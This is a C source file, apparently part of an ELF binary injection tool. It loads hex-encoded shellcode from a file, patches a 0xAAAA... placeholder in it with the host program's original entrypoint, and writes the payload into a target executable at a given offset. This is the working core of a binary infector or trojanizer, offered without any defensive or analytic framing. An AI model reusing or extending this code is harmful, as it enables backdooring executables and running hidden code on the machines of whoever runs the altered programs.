#include <elf.h>
#include <stdio.h>
#include <stdlib.h>

#include "payload.h"

int get_payload(uint8_t **payload, const char *path)
{
	/* Reads payload from disk and converts to binary
    */
	int retval = 0;
	int payload_size = 0;

	FILE *file = fopen(path, "rb");
	if (file == NULL)
	{
		perror("Failed to open payload");
		return 1;
	}
	retval = fseek(file, 0, SEEK_END);
	if (retval < 0)
	{
		perror("Failed to find end of payload file");
		return 1;
	}
	payload_size = ftell(file);
	if (payload_size < 0)
	{
		perror("ftell failure on payload file");
		return 1;
	}

	*payload = calloc(1, payload_size + 1);
	if (*payload == NULL)
	{
		puts("Failed to allocate memory for payload");
		return 1;
	}

	rewind(file);

	/* Convert hex bytes to binary equivalent */
	int byte = 0;
	int counter = 0;
	const char *formatter = "\\x%02x";
	uint8_t *payload_tracker = *payload;
	while (fscanf(file, formatter, &byte) == 1)
	{
		payload_tracker[counter++] = byte;
	}

	*payload = realloc(*payload, counter);

	fclose(file);
	return counter;
}

int stamp_entrypoint(uint8_t *payload, Elf64_Addr entrypoint)
{
	uint8_t *payload_ptr = payload;
	int stamped = 0;

	while (!stamped)
	{
		if (*((long *)payload_ptr) == 0)
		{
			break;
		}
		if (!(*((long *)payload_ptr) ^ 0xAAAAAAAAAAAAAAAA))
		{
			*((long *)payload_ptr) = (long)entrypoint;
			printf("Overwrote placeholder with entrypoint: 0x%lx\n", entrypoint);
			return 0;
		}
		payload_ptr++;
	}

	return 1;
}

int inject_payload(FILE *binary, Elf64_Addr injection_site, uint8_t *payload, int payload_size)
{
	int retval = 0;

	rewind(binary);

	fseek(binary, injection_site, SEEK_CUR);
	retval = fwrite(payload, payload_size, 1, binary);
	if (retval <= 0)
	{
		puts("unable to write payload");
		return 1;
	}

	return 0;
}
